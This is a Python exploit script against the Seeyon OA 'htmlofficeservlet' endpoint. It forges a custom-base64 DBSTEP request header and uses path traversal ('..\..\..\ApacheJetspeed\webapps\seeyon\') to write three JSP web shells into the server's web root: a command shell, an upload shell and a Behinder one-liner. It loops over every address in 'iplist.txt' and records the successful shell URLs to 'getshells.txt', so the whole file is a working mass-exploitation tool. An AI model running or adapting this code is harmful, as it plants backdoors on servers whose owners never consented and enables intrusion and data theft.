import base64
import requests
import hashlib
import urllib.request
import urllib.parse
import ssl


def f_base64decode(cipherlist):
    base64list = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
    length = len(cipherlist)
    group = length / 4
    s = ''
    string = ''

    for i in range(int(group) - 1):
        j = i * 4
        s = cipherlist[j:j + 4]
        string += chr(((base64list.index(s[0])) << 2) + ((base64list.index(s[1])) >> 4))
        string += chr(((base64list.index(s[1]) & 0x0f) << 4) + ((base64list.index(s[2])) >> 2))
        string += chr(((base64list.index(s[2]) & 0x03) << 6) + ((base64list.index(s[3]))))
    j = (group - 1) * 4
    print(j)
    s = cipherlist[int(j):int(j) + 4]
    string += chr(((base64list.index(s[0])) << 2) + ((base64list.index(s[1])) >> 4))
    if s[2] == '6':
        return string
    else:
        string += chr(((base64list.index(s[1]) & 0x0f) << 4) + ((base64list.index(s[2])) >> 2))
    if s[3] == '6':
        return string
    else:
        string += chr(((base64list.index(s[2]) & 0x03) << 6) + ((base64list.index(s[3]))))
        return string


def f_base64encode(input_str):
    base64list = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
    str_ascii_list = ['{:0>8}'.format(str(bin(ord(i))).replace('0b', ''))
                      for i in input_str]
    output_str = ''
    equal_num = 0
    while str_ascii_list:
        temp_list = str_ascii_list[:3]
        if len(temp_list) != 3:
            while len(temp_list) < 3:
                equal_num += 1
                temp_list += ['0' * 8]
        temp_str = ''.join(temp_list)
        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]
        temp_str_list = [int(x, 2) for x in temp_str_list]
        if equal_num:
            temp_str_list = temp_str_list[0:4 - equal_num]
        output_str += ''.join([base64list[x] for x in temp_str_list])
        str_ascii_list = str_ascii_list[3:]
    output_str = output_str + '6' * equal_num
    # print(output_str)
    return output_str

def poc(url, shell_name="msysconfic.jsp"):
    if not url.startswith("http") and not url.startswith("https"):
        url = "http://" + url
        url2 = url

    shell_url = url + "/seeyon/" + shell_name
    shell_name = "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\" + shell_name

    def_shell = open('cmdshell.txt', "rb").read()
    base_header = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkZUFENXlSUUh3TG9pcVJqaWRnNjYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo="

    payload_head_len = 283 + len(f_base64encode(shell_name))
    payload_shell_len = len(def_shell)
    payload_shell = def_shell + bytes(hashlib.md5(def_shell).hexdigest(), 'utf-8')
    payload_shell_name = f_base64encode(shell_name)
    payload = bytes(base64.b64decode(base_header).decode().replace('355', str(payload_head_len)).replace('666', str(
        payload_shell_len)).replace('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeAD5yRQHwLoiqRjidg66',
                                    payload_shell_name), 'utf-8') + payload_shell
    try:
        respose = requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload, timeout=2)
        res = requests.get(url=shell_url, timeout=2).text

        # 上传jsp上传马
        shell1_name = "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\" + "msysconfiu.jsp"
        def1_shell = open('uploadshell.txt', "rb").read()
        payload_head_len1 = 283 + len(f_base64encode(shell1_name))
        payload_shell_len1 = len(def1_shell)
        payload_shell1 = def1_shell + bytes(hashlib.md5(def1_shell).hexdigest(), 'utf-8')
        payload_shell_name1 = f_base64encode(shell1_name)
        payload1 = bytes(
            base64.b64decode(base_header).decode().replace('355', str(payload_head_len1)).replace('666', str(
                payload_shell_len1)).replace('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeAD5yRQHwLoiqRjidg66',
                                             payload_shell_name1), 'utf-8') + payload_shell1
        try:
            respose2 = requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload1, timeout=2)
        except:
            return False

        # 上传冰蝎一句话
        shell2_name = "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\" + "msysconfbx.jsp"
        def2_shell = open('bxshell.txt', "rb").read()
        payload_head_len2 = 283 + len(f_base64encode(shell2_name))
        payload_shell_len2 = len(def2_shell)
        payload_shell2 = def2_shell + bytes(hashlib.md5(def2_shell).hexdigest(), 'utf-8')
        payload_shell_name2 = f_base64encode(shell2_name)
        payload2 = bytes(
            base64.b64decode(base_header).decode().replace('355', str(payload_head_len2)).replace('666', str(
                payload_shell_len2)).replace('qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdeAD5yRQHwLoiqRjidg66',
                                             payload_shell_name2), 'utf-8') + payload_shell2
        try:
            respose3 = requests.post(url=url + "/seeyon/htmlofficeservlet", data=payload2, timeout=2)
        except:
            return False
    except:
        return False

    if ":-)" in res:
        getshellurl = "\n" + shell_url
        print("sussess\n", getshellurl)
        upjspshell = "\n" + url + "/seeyon/" + "msysconfiu.jsp"
        print(upjspshell)
        bxjspshell = "\n" + url + "/seeyon/" + "msysconfbx.jsp"
        print(bxjspshell + "  pass")
        f1 = open('getshells.txt', 'a')
        f1.writelines(getshellurl)
        f1.writelines(upjspshell)
        f1.writelines(bxjspshell)
        f1.close()
        return shell_url
    else:
        return False


if __name__ == "__main__":
    with open('iplist.txt', 'r')as f:
        for x in f.readlines():
            poc(x.rstrip())
